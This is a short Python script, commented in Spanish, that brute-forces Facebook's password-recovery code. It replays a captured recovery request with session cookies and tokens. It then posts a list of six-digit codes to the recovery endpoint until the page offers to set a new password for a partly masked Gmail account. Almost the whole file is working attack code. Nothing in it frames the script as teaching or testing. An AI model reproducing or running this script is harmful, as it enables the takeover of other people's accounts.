################################################################################

# Paso 1: Abrir pagina.
# Clic derecho, inspeccionar, pestaña Red.
# cURL (bash).
# curlconverter.com.


# Paso 2: Lista de codigos

# Paso 3: Bucle (codigos).
# Cadena de caracteres en response.text.
# Si aparece cadena, break.






###############################################################################


# Paso 1.

import requests

cookies = {
    'sb': 'BENcY0XtenT0FCW-f9S179nN',
    'datr': 'BENcYyRtFcrt8j4zRHl5TMqK',
    'locale': 'es_LA',
    'fr': '0OkAeGRn6C427zacm.AWUFI9FlWDqbQBkddd01VouEkNo.BkQeY0.AH.AAA.0.0.BkvwAw.AWWHX7vJoVs',
    'sfiu': 'AYjHpBLkS0WAMW_FkZRSwp-agYc5KLBtjowCZLT7UiJpDOSFRO5rdqeuASJDlgNmc0MHEfcHXlC-btzk2adZ7Aw-BVpkkmqYl0lIUkq5-Lzb3A',
    'wd': '669x651',
}

headers = {
    'authority': 'www.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sb=BENcY0XtenT0FCW-f9S179nN; datr=BENcYyRtFcrt8j4zRHl5TMqK; locale=es_LA; fr=0OkAeGRn6C427zacm.AWUFI9FlWDqbQBkddd01VouEkNo.BkQeY0.AH.AAA.0.0.BkvwAw.AWWHX7vJoVs; sfiu=AYjHpBLkS0WAMW_FkZRSwp-agYc5KLBtjowCZLT7UiJpDOSFRO5rdqeuASJDlgNmc0MHEfcHXlC-btzk2adZ7Aw-BVpkkmqYl0lIUkq5-Lzb3A; wd=669x651',
    'origin': 'https://www.facebook.com',
    'referer': 'https://www.facebook.com/recover/code/?em%5B0%5D=t%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A%2A0%40gmail.com&rm=send_email&spc=0&fl=default_recover&wsr=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.102", "Chromium";v="115.0.5790.102"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'viewport-width': '669',
}

params = {
    'em[0]': 't****************0@gmail.com',
    'rm': 'send_email',
    'spc': '0',
    'fl': 'default_recover',
    'wsr': '0',
}

data = {
    'jazoest': '21029',
    'lsd': 'AVpoXUeqas8',
    'n': '123456',
    'reset_action': '1',
}

response = requests.post('https://www.facebook.com/recover/code/', params=params, cookies=cookies, headers=headers, data=data)


# Paso 2

codes = ["474614","747902","364722","873868","621269","617820","277461","824089","988847","605309","344441","700259","776387","121589","751430","507809","878712","486212","710633","703638","474614","201980","709698","768163","362878","242463","573062","782169","878915","665078","257360","975071","833017","137517","552202","730994","960237","850206","596341","419761","863043","747903"]


# Paso 3

for x in codes:
    data["n"]= x
    response = requests.post('https://www.facebook.com/recover/code/', params=params, cookies=cookies, headers=headers, data=data)
    #if response.status_code == 200:
    #break
    if "Crea una contrase" in response.text:
        print("the code is:", x)
        break
        

print("mission complete!")

